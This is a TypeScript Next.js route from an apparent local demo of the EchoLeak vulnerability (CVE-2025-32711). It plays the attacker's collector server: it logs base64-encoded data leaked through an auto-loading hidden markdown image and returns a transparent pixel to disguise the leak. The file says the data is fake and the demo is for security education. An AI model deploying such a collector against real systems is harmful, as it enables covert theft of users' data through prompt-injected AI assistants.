// ─── EchoLeak Demo — "Attacker" Collector ──────────────────────────────────────
// NOTE: This file is intentionally part of a security demo (EchoLeak / CVE-2025-32711).
// It plays the role of the attacker-controlled server that silently receives
// exfiltrated data when a hidden markdown image auto-loads in the victim's browser.
// Everything is local and the "stolen" credentials are fake demo strings.

import { NextRequest, NextResponse } from 'next/server';

// In-memory log of everything the "attacker" has captured (resets when the dev server restarts).
type Capture = { at: string; raw: string; decoded: string };
const captured: Capture[] = [];

// 1×1 transparent GIF returned for the image request — so the exfil looks like a normal image load.
const PIXEL = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64',
);

// GET /api/collect?d=<base64 payload>   → records the leaked data, returns a pixel
// GET /api/collect?view=1               → returns the capture log (for the attacker panel)
export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);

  if (searchParams.get('view') === '1') {
    return NextResponse.json({ captured });
  }

  const d = searchParams.get('d') ?? '';
  if (d) {
    let decoded = '';
    try {
      decoded = Buffer.from(d, 'base64').toString('utf8');
    } catch {
      decoded = '<undecodable>';
    }
    captured.push({ at: new Date().toISOString(), raw: d, decoded });
  }

  return new NextResponse(PIXEL, {
    headers: { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store' },
  });
}

// DELETE /api/collect → clears the capture log (reset button)
export async function DELETE() {
  captured.length = 0;
  return NextResponse.json({ ok: true });
}
